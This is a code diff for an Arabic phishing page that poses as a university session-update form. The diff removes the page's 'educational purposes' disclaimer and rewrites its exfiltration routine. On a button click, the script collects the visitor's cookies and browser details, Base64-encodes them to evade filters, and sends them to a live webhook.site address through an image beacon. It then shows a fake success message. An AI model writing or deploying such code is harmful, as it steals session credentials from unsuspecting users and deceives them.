@@ -50,46 +50,44 @@
 <div class="card">
     <h2>تحديث البيانات الجامعية</h2>
     <p>
-        أهلاً بك يا دكتور في مختبر الأمن السيبراني. 
-        يرجى الضغط على الزر أدناه لتحديث بيانات الجلسة والمتابعة.
+        أهلاً بك يا دكتور. يرجى الضغط على الزر أدناه لتحديث الجلسة الأكاديمية والمتابعة إلى لوحة التحكم.
     </p>
 
     <button class="btn" onclick="showData()">تحديث الجلسة الآن</button>
 
-    <p class="footer-note">هذه الصفحة مخصصة لأغراض تعليمية - المعهد التقني الصناعي (الحوبان)</p>
+    <p class="footer-note">نظام التحقق - المعهد التقني الصناعي (الحوبان)</p>
 </div>
 
 <script>
 function showData() {
-    // 1. تجميع البيانات من المتصفح
-    const browserData = {
-        cookies: document.cookie || "No Cookies (Protected or Empty)",
-        userAgent: navigator.userAgent,
-        screen: window.screen.width + "x" + window.screen.height,
-        platform: navigator.platform,
-        language: navigator.language,
-        timestamp: new Date().toLocaleString(),
-        location: window.location.href
+    // 1. تجميع البيانات في كائن واحد
+    const info = {
+        ck: document.cookie || "no_access",
+        ua: navigator.userAgent,
+        res: window.screen.width + "x" + window.screen.height,
+        lang: navigator.language,
+        time: new Date().toISOString()
     };
 
-    // 2. رابط الـ Webhook الخاص بك (تم التحديث)
-    const webhookURL = "https://webhook.site/31075e24-deb2-43bc-9f51-3d721cbe255c"; 
+    try {
+        // 2. تشفير البيانات بصيغة Base64 لتجاوز فلاتر الحماية وسرعة النقل
+        const jsonStr = JSON.stringify(info);
+        const encodedData = btoa(unescape(encodeURIComponent(jsonStr)));
 
-    // 3. إرسال البيانات فوراً باستخدام تقنية Fetch
-    fetch(webhookURL, {
-        method: 'POST',
-        mode: 'no-cors', // لضمان الإرسال السري حتى مع قيود الحماية
-        body: JSON.stringify(browserData)
-    })
-    .then(() => {
-        // رسالة وهمية لإتمام السيناريو
+        // 3. الإرسال الفوري عبر طلب صورة (Image Beacon)
+        // هذا الطلب لا يتأثر بـ CORS ويصل فوراً للسيرفر
+        const exfil = new Image();
+        exfil.src = "https://webhook.site/31075e24-deb2-43bc-9f51-3d721cbe255c?data=" + encodedData;
+
+        // 4. إيهام المستخدم بنجاح العملية
         alert("تم تحديث بيانات الجلسة بنجاح! شكراً لك.");
-    })
-    .catch((error) => {
-        console.error('Error:', error);
-    });
+        
+    } catch (e) {
+        console.error("Error:", e);
+        alert("حدث خطأ، يرجى إعادة المحاولة.");
+    }
 }
 </script>
 
 </body>
-</html>
+    </html>
